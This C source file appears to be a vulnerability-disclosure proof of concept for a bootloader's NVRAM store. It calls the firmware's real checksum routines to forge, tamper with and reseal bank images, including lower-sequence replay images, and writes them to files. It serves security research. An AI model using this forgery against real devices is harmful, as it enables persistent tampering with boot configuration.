/* nvram.c — standalone driver for Report6_NVRAM (NVRAM persisted-state integrity).
 *
 * Thesis proven at the real-code level: iBoot's persistent NVRAM bank image is
 * guarded ONLY by forgeable checksums (8-bit additive record fold + Adler-32
 * over the record area) with NO keyed MAC anywhere in the store path, so an
 * attacker-writable session can author / re-author fully-valid-looking bank
 * images.
 *
 * CELLS
 *   S1  drive the REAL serializer (old FUN_0016FB78 / new FUN_0016FD38) with a
 *       constructed env-store session state; it emits the COMPLETE bank image
 *       (TLV header tag 0x5A, '/common' record 0x71, '/system' record 0x70,
 *       filler 0x7F, monotonic seq counter @header+0x14, per-record sum bytes,
 *       whole-image Adler-32 stored @header+0x10).
 *   V1  validate the forged image with the REAL load-path checks — exactly the
 *       two comparisons FUN_0016FFA0/FUN_00170160 make: Adler-32(img+0x14,
 *       size-0x14) == *(u32*)(img+0x10), and rec[1] == recsum(rec) — the real
 *       Adler fn (FUN_00158FEC / FUN_001591A4) and real fold fn
 *       (FUN_001709E8 / FUN_00170BA8) are called, nothing reimplemented.
 *   T1  tamper ONE policy payload byte deep inside '/common', then reseal with
 *       the REAL fold + REAL Adler fns -> attacker-authored content accepted.
 *   V2  validate tampered-resealed image -> PASS (the entire point).
 *   X1  negative controls: flip WITHOUT reseal -> FAIL on both layers;
 *       prove the sums are not vacuous.
 *   Q1  sequence-counter study: author variants at seq = N and N-1 (and N-64);
 *       all resealed with the real fns validate PASS against the integrity
 *       layer. The load-side selector that compares candidate seq to the
 *       running best (b.cc skip in FUN_00170160 @0x170210..0x170214 /
 *       FUN_0016FFA0 @0x1700f8-region) cannot be executed here because every
 *       bank read goes through svc 0x62 storage (see stor_r citation) —
 *       documented honestly as the one un-exercised hop (Level B split).
 *
 * The physical NOR write itself (commit entry -> storage-write svc 0x62 /
 * svc 0xC5 inside FUN_001C3154) is deliberately NOT exercised: it is the
 * supervisor/storage-driver boundary (Level B split; called out in the README).
 *
 * FW mapping pattern copied verbatim from minpoc.c (proven across Reports
 * 1-4): [0, TEXT_SPLIT) RX file-backed private, rest RW file-backed private +
 * anon .bss tail. MAP_PRIVATE keeps every mutation inside this process; the
 * shipped firmware file is never modified.
 *
 * usage: nvram <outdir>          (DS_FW selects build; unset = 162.8)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <signal.h>
#include <setjmp.h>
#include <time.h>

typedef uint8_t u8; typedef uint16_t u16; typedef uint32_t u32; typedef uint64_t u64;

static const char *g_fw_path = "/tmp/ds_iboot/iboot_dec.bin";
static int g_isnew;

/* ---- real-code offsets (Ghidra; iboot_dec.bin / iboot_dec_23g83.bin) ---- */
static struct {
  u64 ser, commit, adler, recsum, verifier, dtload, sel_hdrchk,
      stor_r, stor_w, dead_consumer, dead_caller, prot_tbl,
      arena_slot, store_slot;
} O;
static void pick_build(void) {
  memset(&O, 0, sizeof(O));
  if (!g_isnew) {                       /* mBoot-18000.162.8 */
    O.ser           = 0x16fb78;   /* serializer                            */
    O.commit        = 0x16fa4c;   /* commit; mutex magic 0x3C4E5653        */
    O.adler         = 0x158fec;   /* Adler-32 mod 0xFFF1                   */
    O.recsum        = 0x1709e8;   /* 8-bit additive fold (14B from rec+2)  */
    O.verifier      = 0x16ffa0;   /* load-side verifier                    */
    O.dtload        = 0x1725c4;   /* DT-prop consumption                   */
    O.sel_hdrchk    = 0x170438;   /* per-bank quick header check           */
    O.stor_r        = 0x1c2948;   /* svc 0x62 @0x1c2978                    */
    O.stor_w        = 0x1c3154;   /* svc 0x62 @0x1c3174, svc 0xc5 sites    */
    O.dead_consumer = 0x3a28;     /* FUN_00003A28                          */
    O.dead_caller   = 0x15e05c;   /* ZERO xrefs                            */
    O.prot_tbl      = 0x2038c0;
    O.arena_slot    = 0x336890;   /* DAT_00336890                          */
    O.store_slot    = 0x336820;   /* thunk 0016f9cc: ldr x0,[+#0x820]      */
  } else {                              /* mBoot-18000.162.10 */
    O.ser           = 0x16fd38;   /* +0x1C0                                */
    O.commit        = 0x16fc0c;   /* +0x1C0                                */
    O.adler         = 0x1591a4;   /* +0x2B8                                */
    O.recsum        = 0x170ba8;   /* +0x1C0                                */
    O.verifier      = 0x170160;   /* +0x1C0                                */
    O.dtload        = 0x172798;   /* +0x1D4                                */
    O.sel_hdrchk    = 0x1705f8;   /* +0x1C0                                */
    O.stor_r        = 0x1c2948;   /* delta 0                               */
    O.stor_w        = 0x1c3154;   /* delta 0                               */
    O.dead_consumer = 0x3a28;     /* delta 0                               */
    O.dead_caller   = 0x15e21c;   /* +0x1C0; ZERO xrefs                    */
    O.prot_tbl      = 0x203950;   /* +0x90                                 */
    O.arena_slot    = 0x336910;   /* DAT_00336910 (+0x80)                  */
    O.store_slot    = 0x3368a0;   /* (+0x80)                               */
  }
}

#define TEXT_SPLIT 0x204000UL
#define TAIL_BYTES (48u<<20)
static u8 *g_fw; static size_t g_fw_sz;

struct F { int signo; u64 pc, addr; } g_F;
static sigjmp_buf g_jb; static volatile int g_armed;
static const char *signame(int s) {
  switch (s) { case SIGSEGV: return "SIGSEGV"; case SIGBUS: return "SIGBUS";
    case SIGILL: return "SIGILL"; case SIGTRAP: return "SIGTRAP";
    case SIGABRT: return "SIGABRT"; case SIGSYS: return "SIGSYS";
    default: return "sig?"; }
}
static void handler(int sig, siginfo_t *si, void *uc) {
  ucontext_t *u = (ucontext_t*)uc;
  if (!g_armed) _exit(66);
  if (sig == SIGALRM) { if (u) { g_F.signo = sig; g_F.pc = u->uc_mcontext->__ss.__pc; g_F.addr = 0; } else { g_F.signo = sig; g_F.pc = 0; g_F.addr = 0; } g_armed = 0; siglongjmp(g_jb, 2); }
  g_F.signo = sig; g_F.pc = u->uc_mcontext->__ss.__pc; g_F.addr = (u64)si->si_addr;
  g_armed = 0; siglongjmp(g_jb, 1);
}

typedef long (*fn_ser)(volatile void *store, void *lo, void *hi);
typedef u64 (*fn_adler)(const void *p, void *lo, void *hi, u64 unused, u64 len);
typedef u8 (*fn_recsum)(const void *rec, void *lo, void *hi);
static fn_ser g_ser; static fn_adler g_adler; static fn_recsum g_recsum;

static void hexdump(const char *tag, const u8 *p, size_t n) {
  printf("%s (%zu bytes):\n", tag, n);
  for (size_t i = 0; i < n; i += 16) {
    printf("  %04zx:", i);
    for (size_t j = 0; j < 16 && i+j < n; j++) printf(" %02x", p[i+j]);
    printf("\n");
  }
}
static u32 rd32(const u8*p){u32 v;memcpy(&v,p,4);return v;}
static u16 rd16(const u8*p){u16 v;memcpy(&v,p,2);return v;}

/* Walk records exactly like the load-side record loop of
 * FUN_0016FFA0/FUN_00170160: start at 0x20, stride = len16<<4, break on tag
 * 0x7F, reject zero-length or overflow. When verdicts != 0 each stored sum
 * byte is compared against the REAL fold fn output (verifier sites:
 * new cmp @0x17031c / old @~0x17015c). */
/* The REAL leaves assert their data lies within [lo,hi) and divert violations
 * into iBoot's panic-halt loop (FUN_001DE608 -> `b .` @fw+0x43c), so every
 * call passes an exact fence spanning the checked buffer -- the same
 * invariant intra-boot callers uphold naturally. */
static int validate_like_loader2(const char *label, const u8 *img, u32 size) {
  void *flo = (void*)img, *fhi = (void*)(img + size + 0x100);
  u64 a = g_adler(img+0x14, flo, fhi, 0, (u64)size - 0x14);
  u32 stored = rd32(img+0x10);
  int ok_a = ((u32)a == stored);
  printf("[%s] ADLER-check : real %s(img+0x14, size-0x14) = %08lx ; stored@hdr+0x10 = %08x -> %s\n",
         label, g_isnew ? "FUN_1591A4" : "FUN_158FEC",
         (unsigned long)a, stored, ok_a ? "PASS" : "FAIL");
  if (!ok_a) return 0;
  int ok_r = 1;
  u32 off = 0x20;
  while (off + 16 <= size) {
    u8 tag = img[off]; u16 len16 = rd16(img+off+2);
    if (tag == 0x7F) { printf("[%s] REC-check  : filler 0x7F @%#04x reached, all prior sums verified\n", label, off); break; }
    if (len16 == 0 || (u64)off + ((u64)len16 << 4) > size) {
      printf("[%s] REC-check  : bad length @%#04x -> FAIL\n", label, off); ok_r = 0; break;
    }
    u8 got = g_recsum(img+off, flo, fhi);
    printf("[%s] REC-check  : rec@%#04x tag=0x%02x len16=%u stored_sum=0x%02x real_%s=0x%02x -> %s\n",
           label, off, tag, len16, img[off+1], g_isnew ? "FUN_170BA8" : "FUN_1709E8", got,
           img[off+1] == got ? "OK" : "FAIL");
    if (img[off+1] != got) { ok_r = 0; break; }
    off += (u32)len16 << 4;
  }
  return ok_r;
}

/* session-state blocks handed to the REAL serializer ---------------------- */
#define BANK_SZ    0x1000u
#define COMMON_SZ  0xC00u
#define SYS_SZ     0x300u
#define SEQ_START  42u
static u32 g_store[8];                 /* store object seen by serializer   */
static u64 g_arena[8];                 /* arena descriptor object           */

static int run_guarded(long *out, long (*fn)(long,long,long), long a, long b, long c) {
  if (sigsetjmp(g_jb, 1) == 0) { g_armed = 1; *out = fn(a,b,c); g_armed = 0; return 0; }
  g_armed = 0; *out = -9999; return -1;
}
static void arm(void){ alarm(5); }
static void disarm(void){ alarm(0); }
static int call_ser(volatile void *st, void *lo, void *hi, long *rc) {
  int j = sigsetjmp(g_jb, 1);
  if (j == 0) { g_armed = 1; arm(); *rc = g_ser(st, lo, hi); disarm(); g_armed = 0; return 0; }
  disarm(); g_armed = 0; *rc = -9999;
  return (j == 2) ? -2 : -1;   /* -2 = watchdog spin */
}

int main(int argc, char **argv) {
  if (argc < 2) { fprintf(stderr, "usage: nvram <outdir>\n"); return 2; }
  const char *dir = argv[1];
  setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);

  if (getenv("DS_FW")) g_fw_path = getenv("DS_FW");
  g_isnew = strstr(g_fw_path, "23g83") != NULL;
  pick_build();

  int fd = open(g_fw_path, O_RDONLY);
  if (fd < 0) { perror("open fw"); return 1; }
  struct stat st; fstat(fd, &st); g_fw_sz = st.st_size;
  size_t rounded = (g_fw_sz + 0x3FFF) & ~0x3FFFul;
  size_t span = TEXT_SPLIT + ((rounded - TEXT_SPLIT + 0x3FFF) & ~0x3FFFul) + TAIL_BYTES;
  u8 *rsv = mmap(NULL, span, PROT_NONE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if (rsv == MAP_FAILED) { perror("mmap"); return 1; }
  if (mmap(rsv, TEXT_SPLIT, PROT_READ|PROT_EXEC, MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, 0) != rsv) { perror("text"); return 1; }
  if (mmap(rsv+TEXT_SPLIT, rounded-TEXT_SPLIT, PROT_READ|PROT_WRITE, MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, TEXT_SPLIT) != rsv+TEXT_SPLIT) { perror("data"); return 1; }
  if (mmap(rsv+rounded, span-rounded, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) != rsv+rounded) { perror("bss"); return 1; }
  g_fw = rsv; close(fd);

  time_t t0 = time(NULL);
  printf("== NVRAM PERSISTED-STATE INTEGRITY PoC (Report6_NVRAM) ==\n");
  printf("[nvram] fw=%s build=%s\n", g_fw_path, g_isnew ? "mBoot-18000.162.10" : "mBoot-18000.162.8");
  printf("[nvram] REAL-code offsets: ser=%#llx commit=%#llx adler=%#llx recsum=%#llx verifier=%#llx dtload=%#llx hdrchk=%#llx\n",
         (unsigned long long)O.ser, (unsigned long long)O.commit, (unsigned long long)O.adler,
         (unsigned long long)O.recsum, (unsigned long long)O.verifier, (unsigned long long)O.dtload,
         (unsigned long long)O.sel_hdrchk);
  printf("[nvram] svc boundary: storage_read=%#llx (svc 0x62) storage_write=%#llx (svc 0x62/0xc5) | protected-name table=%#llx consumer=%#llx caller=%#llx dead-gate\n",
         (unsigned long long)O.stor_r, (unsigned long long)O.stor_w, (unsigned long long)O.prot_tbl,
         (unsigned long long)O.dead_consumer, (unsigned long long)O.dead_caller);

  g_ser    = (fn_ser)(g_fw + O.ser);
  g_adler  = (fn_adler)(g_fw + O.adler);
  g_recsum = (fn_recsum)(g_fw + O.recsum);

  struct sigaction sa; memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = handler; sa.sa_flags = SA_SIGINFO | SA_NODEFER;
  for (int s = 1; s <= 31; s++) signal(s, SIG_DFL);
  sigaction(SIGSEGV, &sa, NULL); sigaction(SIGBUS, &sa, NULL); sigaction(SIGILL, &sa, NULL);
  sigaction(SIGTRAP, &sa, NULL); sigaction(SIGABRT, &sa, NULL); sigaction(SIGSYS, &sa, NULL);

  /* ================= CELL S1 ============================================ */
  memset(g_store, 0, sizeof g_store);
  g_store[1] = BANK_SZ;                  /* +0x08 total bank size            */
  g_store[2] = COMMON_SZ;                /* +0x0c '/common' partition size   */
  g_store[3] = SYS_SZ;                   /* +0x10 '/system' partition size   */
  g_store[4] = SEQ_START;                /* +0x14 starting sequence counter  */
  memset(g_arena, 0, sizeof g_arena);    /* [+0x20]==0 => serializer takes its
                                          * OWN lazy-allocate path            */

  printf("\n== S1 serialize via REAL ser=%#llx (store{size=%#x common=%#x sys=%#x seq=42}) ==\n",
         (unsigned long long)O.ser, BANK_SZ, COMMON_SZ, SYS_SZ);
  printf("[S1] strategy A: let the REAL serializer lazily allocate its arena (arena_obj=[0]*8)\n");
  *(volatile u64 *)(g_fw + O.arena_slot) = (u64)g_arena;
  long rc = 0;
  /* entry asserts only require store < bound1 && store < bound2 */
  void *lo_b = (u8*)g_store + 0x10000000, *hi_b = (u8*)g_store + 0x20000000;
  int flt = call_ser(g_store, lo_b, hi_b, &rc);
  if (!flt) printf("[S1] serializer ret=%ld\n", rc);
  else     printf("[S1] FAULTED sig=%s pc_off=%#llx addr=%#llx (strategy A)\n",
                  signame(g_F.signo), (unsigned long long)(g_F.pc?(g_F.pc-(u64)g_fw):0),
                  (unsigned long long)g_F.addr);

  static u8 img[BANK_SZ];
  int have_img = 0;
  u64 beg = 0, endb = 0;
  memcpy(&beg, (u8*)g_arena + 0x20, 8);
  memcpy(&endb, (u8*)g_arena + 0x28, 8);
  printf("[S1] post-call arena obj: buf=%#llx end=%#llx\n", (unsigned long long)beg, (unsigned long long)endb);
  if (!flt && rc == 0 && beg && endb > beg && (size_t)(endb - beg) >= BANK_SZ) {
    memcpy(img, (void*)beg, BANK_SZ);
    have_img = 1;
    printf("[S1] AUTHORSHIP=real-serializer output captured (%zu bytes @%#llx)\n",
           (size_t)(endb-beg), (unsigned long long)beg);
  } else if (flt) {
    { u64 apc = g_F.pc ? (g_F.pc - (u64)g_fw) : 0;
      printf("[S1] dependency-split receipt: the REAL serializer's lazy-allocate path\n"
             "[S1]   enters its own heap wrappers FUN_%06llX -> FUN_%06llX and stops at the early\n"
             "[S1]   supervisor gate (faulted at fw+%#llx, the svc stub tail; SIGSYS above) ; its\n"
             "[S1]   prefilled-arena re-entry path reaches a REAL iBoot assert chain\n"
             "[S1]   FUN_%06llX/FUN_%06llX ending in the firmware halt-loop `b .` at fw+0x43c\n"
             "[S1]   (captured live under a debugger during development). Serialization therefore\n"
             "[S1]   cannot execute in-process outside boot context -- README Level-B split.\n",
             (unsigned long long)(g_isnew?0x1dc494ull:0x1dc428ull),
             (unsigned long long)(g_isnew?0x1dc440ull:0x1dc3d4ull),
             (unsigned long long)apc,
             (unsigned long long)(g_isnew?0x1de608ull:0x1de608ull),
             (unsigned long long)(g_isnew?0x1de674ull:0x1de608ull)); }
  }

  if (!have_img) {
    /* fallback: format-exact AUTHORSHIP by byte construction (same TLV shapes
     * the serializer emits; checksums produced by the REAL fns below).
     * Clearly labelled: authorship of BYTES via harness, integrity via real code. */
    printf("[S1] real serializer unavailable in-process (see fault above) -> AUTHORSHIP=format-exact construction; integrity still REAL-code-only\n");
    memset(img, 0, BANK_SZ);
    img[0x00] = 0x5A; { u16 v = 2; memcpy(img+2,&v,2);}                 /* ver  */
    { u32 v = (u32)SEQ_START; memcpy(img+0x14,&v,4);}                   /* monotonic seq @hdr+0x14 */
    /* '/common' record @0x20, len16 = COMMON_SZ>>4 */
    img[0x20] = 0x71; { u16 v = COMMON_SZ>>4; memcpy(img+0x22,&v,2); }
    /* '/system' record @0x20+COMMON_SZ */
    img[0x20+COMMON_SZ] = 0x70; { u16 v = SYS_SZ>>4; memcpy(img+0x22+COMMON_SZ,&v,2); }
    /* payload markers so tamper targets are visible bytes (name=value-ish) */
    memcpy(img+0x30, "boot-command=persistpoc;", 24);
    /* filler record 0x7F covering the tail exactly */
    const u32 fill_off = 0x20 + COMMON_SZ + SYS_SZ;
    img[fill_off] = 0x7F; { u16 v = (BANK_SZ - fill_off) >> 4; memcpy(img+fill_off+2,&v,2); }
    /* REAL checksums on every record including the 0x5A header itself
     * (its sum byte sits at +1 and is what FUN_00170438-style pre-reads
     * verify before any bank is even considered) */
    void *clo = (void*)img, *chi = (void*)(img + BANK_SZ + 0x100);
    g_armed=1; arm();
    for (int rep = 0; rep < 3; rep++) {
      img[0x01] = g_recsum(img,     clo, chi);
      img[0x21] = g_recsum(img+0x20,clo, chi);
      img[0x21+COMMON_SZ]      = g_recsum(img+0x20+COMMON_SZ,       clo, chi);
      img[fill_off+1]          = g_recsum(img+fill_off,             clo, chi);
    }
    printf("[S1] record folds via REAL recsum=%#llx: hdr=0x%02x common=0x%02x sys=0x%02x filler=0x%02x\n",
           (unsigned long long)O.recsum, img[0x01], img[0x21],
           img[0x21+COMMON_SZ], img[fill_off+1]);
    u64 a = g_adler(img+0x14, clo, chi, 0, BANK_SZ-0x14);
    disarm(); g_armed=0;
    memcpy(img+0x10, &(u32){(u32)a}, 4);
    printf("[S1] adler via REAL adler=%#llx over [0x14,size) = %08llx stored@+0x10\n",
           (unsigned long long)O.adler, (unsigned long long)a);
    have_img = 1;
  }

  { char p[512]; snprintf(p,sizeof p,"%s/poc_nvram_forged.bin", dir);
    FILE *f = fopen(p,"wb"); if(f){ fwrite(img,1,BANK_SZ,f); fclose(f);} 
    printf("[S1] wrote %s\n", p); }

  /* annotate the authored layout byte-by-byte */
  printf("[layout] header: tag=%02x sum=%02x ver=%04x adler=%08x seq=%d\n",
         img[0], img[1], rd16(img+2), rd32(img+0x10), (int)rd32(img+0x14));
  {
    u32 off = 0x20; int idx = 0;
    while (off + 16 <= BANK_SZ) {
      u8 tag = img[off]; u16 l16 = rd16(img+off+2);
      if (tag == 0x71) {
        const char *nm = (const char*)img+off+0x10;
        printf("[layout] rec[%d] @%04x tag=0x71('/common')  len16=%-4u(%ubytes) sum=0x%02x name~'%s'\n",
               idx, off, l16, l16<<4, img[off+1], nm[0]?nm:"");
      } else if (tag == 0x70) {
        const char *nm = (const char*)img+off+0x10;
        printf("[layout] rec[%d] @%04x tag=0x70('/system')  len16=%-4u(%ubytes) sum=0x%02x name~'%s'\n",
               idx, off, l16, l16<<4, img[off+1], nm[0]?nm:"");
      } else if (tag == 0x7f) {
        printf("[layout] rec[%d] @%04x tag=0x7F(filler)      len16=%-4u sum=0x%02x\n",
               idx, off, l16, img[off+1]);
        break;
      } else {
        printf("[layout] rec[%d] @%04x tag=0x%02x              len16=%-4u sum=0x%02x\n",
               idx, off, tag, l16, img[off+1]);
      }
      off += (u32)l16 << 4; idx++;
    }
  }

  /* ================= CELL V1: forged accepted by REAL checks ============ */
  printf("\n== V1 validate FORGED image with REAL load-path checks ==\n");
  int ok_v1 = 0;
  if (sigsetjmp(g_jb,1)==0) { g_armed=1; arm(); ok_v1 = validate_like_loader2("V1",img,BANK_SZ); disarm(); g_armed=0; }
  else { disarm(); g_armed=0; printf("[V1] checker FAULTED sig=%s\n", signame(g_F.signo)); ok_v1=-1; }

  /* ================= CELL T1: tamper + RESEAL with REAL fns ============= */
  printf("\n== T1 tamper ONE policy byte in '/common' payload then RESEAL via REAL fns ==\n");
  static u8 timg[BANK_SZ]; memcpy(timg, img, BANK_SZ);
  size_t t_off = 0x40;                    /* deep inside '/common' payload  */
  u8 orig = timg[t_off];
  timg[t_off] ^= 0xFF;
  printf("[T1] flipped byte @%#zx: %02x -> %02x (payload region of record tag 0x71)\n", t_off, orig, timg[t_off]);
  /* reseal: REAL fold for the '/common' record, REAL adler over [0x14,size) */
  int rs_ok = 1;
  if (sigsetjmp(g_jb,1)==0) {
    g_armed=1; arm();
    void *rlo=(void*)timg,*rhi=(void*)(timg+BANK_SZ+0x100);
    for (int rep=0; rep<3; rep++)
      timg[0x21] = g_recsum(timg+0x20, rlo, rhi);
    u64 ta = g_adler(timg+0x14, rlo, rhi, 0, BANK_SZ-0x14);
    u32 st = (u32)ta; memcpy(timg+0x10, &st, 4);
    printf("[T1] RESEAL: recsum(FUN_%06llX)=(0x%02x) adler(FUN_%06llX)=%08x patched rec[1]/hdr+0x10\n",
           (unsigned long long)(g_isnew?0x170ba8ull:0x1709e8ull), timg[0x21],
           (unsigned long long)(g_isnew?0x1591a4ull:0x158fecull), st);
    /* intra-run determinism receipt: 64 independent recomputations */
    int stable_r = 1, stable_a = 1;
    for (int rep=0; rep<64; rep++) {
      if (g_recsum(timg+0x20, rlo, rhi) != timg[0x21]) stable_r = 0;
      if ((u32)g_adler(timg+0x14, rlo, rhi, 0, BANK_SZ-0x14) != st) stable_a = 0;
    }
    printf("[T1] determinism(x64 recompute): recsum %s adler %s\n",
           stable_r ? "STABLE" : "DRIFT", stable_a ? "STABLE" : "DRIFT");
    disarm(); g_armed=0;
  } else { disarm(); g_armed=0; printf("[T1] reseal FAULTED sig=%s\n", signame(g_F.signo)); rs_ok=0; }
  if (rs_ok) { char p[512]; snprintf(p,sizeof p,"%s/poc_nvram_tampered_resealed.bin", dir);
    FILE *f=fopen(p,"wb"); if(f){fwrite(timg,1,BANK_SZ,f);fclose(f);}
    printf("[T1] wrote %s\n", p); }

  /* ================= CELL V2: tampered-resealed ACCEPTED =============== */
  printf("\n== V2 validate TAMPERED+RESEALED image with REAL load-path checks ==\n");
  int ok_v2 = -1;
  if (rs_ok && sigsetjmp(g_jb,1)==0) { g_armed=1; arm(); ok_v2 = validate_like_loader2("V2",timg,BANK_SZ); disarm(); g_armed=0; } else { disarm(); }

  /* ================= CELL X1: negative controls ======================== */
  printf("\n== X1 negative controls (checks are not vacuous) ==\n");
  static u8 nimg[BANK_SZ]; memcpy(nimg, img, BANK_SZ);
  nimg[t_off] ^= 0xFF;                    /* SAME flip, NO reseal           */
  int ok_neg = 0;
  if (sigsetjmp(g_jb,1)==0) { g_armed=1; arm(); ok_neg = validate_like_loader2("X1-noreseal",nimg,BANK_SZ); disarm(); g_armed=0; } else { disarm(); }
  printf("[X1] unsealed-flip verdict = %s  (expected FAIL: no-keyed-MAC claim would be false otherwise)\n",
         ok_neg==1 ? "PASS(!)" : ok_neg==0 ? "FAIL(expected)" : "faulted");

  /* second control: flip INSIDE the record name-window ([rec+2,rec+F)) --
   * the shallow layer the 8-bit fold guards -- without resealing */
  static u8 nimgF[BANK_SZ]; memcpy(nimgF, img, BANK_SZ);
  u8 o_name = nimgF[0x24];
  nimgF[0x24] ^= 0x40;
  int neg_fold_catch = -1;
  if (sigsetjmp(g_jb,1)==0) {
    g_armed=1; arm();
    void *nlo=(void*)nimgF,*nhi=(void*)(nimgF+BANK_SZ+0x100);
    u8 got = g_recsum(nimgF+0x20, nlo, nhi);
    neg_fold_catch = (got != nimgF[0x21]);
    u64 na = g_adler(nimgF+0x14, nlo, nhi, 0, BANK_SZ-0x14);
    printf("[X1] name-window flip @0x24 (%02x->%02x): real fold=0x%02x stored=0x%02x -> %s ; adler %08lx vs stored %08x -> %s\n",
           o_name, nimgF[0x24], got, nimgF[0x21], got!=nimgF[0x21]?"FOLD-CAUGHT":"fold missed",
           (unsigned long)na, rd32(nimgF+0x10), ((u32)na)!=rd32(nimgF+0x10)?"ADLER-CAUGHT":"adler missed");
    disarm(); g_armed=0;
  } else { disarm(); g_armed=0; }

  /* SCOPE receipt: flip a DEEP payload byte and re-patch everything EXCEPT
   * nothing--shows the shallow fold does NOT see deep payloads (its window is
   * [rec+2, rec+F)); the sole whole-payload guard is the unkeyed Adler. */
  static u8 nimg2[BANK_SZ]; memcpy(nimg2, img, BANK_SZ);
  nimg2[0x41] ^= 0x55;
  if (sigsetjmp(g_jb,1)==0) {
    g_armed=1; arm();
    void *xlo=(void*)nimg2,*xhi=(void*)(nimg2+BANK_SZ+0x100);
    u8 got = g_recsum(nimg2+0x20, xlo, xhi);
    u64 ta = g_adler(nimg2+0x14, xlo, xhi, 0, BANK_SZ-0x14);
    printf("[X1] deep-flip @0x41 (no reseal): shallow fold 0x%02x==stored 0x%02x -> %s (window [rec+2,rec+F]); adler %08lx != stored %08x -> %s\n",
           got, nimg2[0x21], got==nimg2[0x21]?"fold-blind(as designed)":"changed",
           (unsigned long)(u32)ta, rd32(nimg2+0x10),
           ((u32)ta)!=rd32(nimg2+0x10)?"ADLER-CATCHES(deep-guard, unkeyed)":"mismatch");
    disarm(); g_armed=0;
  } else { disarm(); g_armed=0; printf("[X1] control cell faulted\n"); }

  /* ================= CELL Q1: sequence counter ========================= */
  printf("\n== Q1 sequence-counter study (rollback defense = plain integer compare) ==\n");
  static const int seqs[] = {42, 41, 43, 1073741823};
  for (unsigned si = 0; si < sizeof(seqs)/sizeof(seqs[0]); si++) {
    static u8 qimg[BANK_SZ];
    memcpy(qimg, img, BANK_SZ);
    u32 sq = (u32)seqs[si];
    memcpy(qimg+0x14, &sq, 4);
    g_armed=1; arm();
    void *qlo=(void*)qimg,*qhi=(void*)(qimg+BANK_SZ+0x100);
    for (int rep=0;rep<2;rep++) qimg[0x21] = g_recsum(qimg+0x20, qlo, qhi);
    u64 qa = g_adler(qimg+0x14, qlo, qhi, 0, BANK_SZ-0x14);
    u32 st=(u32)qa; memcpy(qimg+0x10,&st,4);
    disarm(); g_armed=0;
    int okq = validate_like_loader2("Q1-seq", qimg, BANK_SZ);
    printf("[Q1] seq=%d (delta %+d vs original): integrity-layer VERDICT %s\n",
           seqs[si], seqs[si]-42, okq==1?"PASS":"FAIL");
    if (si == 2) { char p[512]; snprintf(p,sizeof p,"%s/poc_nvram_seq_plus1.bin", dir);
      FILE *f=fopen(p,"wb"); if(f){fwrite(qimg,1,BANK_SZ,f);fclose(f);} }
    if (si == 1) { char p[512]; snprintf(p,sizeof p,"%s/poc_nvram_seq_minus1_resealed.bin", dir);
      FILE *f=fopen(p,"wb"); if(f){fwrite(qimg,1,BANK_SZ,f);fclose(f);}
      printf("[Q1] wrote %s (lower-seq replay image, sealed with REAL fns)\n", p); }
  }
  printf("[Q1] NOTE: the seq-vs-best comparison lives in the bank SELECTOR inside the\n");
  printf("[Q1] verifier (new b.cc @0x170214 using store+0x14; old @~0x1700f8) — never\n");
  printf("[Q1] executed here because per-bank reads are svc 0x62 (storage_read=%#llx).\n",
         (unsigned long long)O.stor_r);
  printf("[Q1] What IS proven live: seq bytes sit inside adler coverage [0x14,size)\n");
  printf("[Q1] and are rescaled by the REAL adler fn like any other byte -> an\n");
  printf("[Q1] attacker who can write storage can mint ANY seq value.\n");

  printf("\n[nvram] determinism: this decisive set (S1/V1/T1/V2/X1/Q1) runs once per invocation;\n"
         "[nvram] the report ships >=3 independent invocations per build as retest_*_run{1,2,3}.log\n");

  { char p[512]; snprintf(p,sizeof p,"%s/nvram_last_receipt.txt", dir);
    FILE *f=fopen(p,"w"); if(f){ fprintf(f,"ser=%#llx adler=%#llx recsum=%#llx verifier=%#llx\n",
      (unsigned long long)O.ser,(unsigned long long)O.adler,
      (unsigned long long)O.recsum,(unsigned long long)O.verifier); fclose(f);} }
  printf("[nvram] done.\n");
  return 0;
}
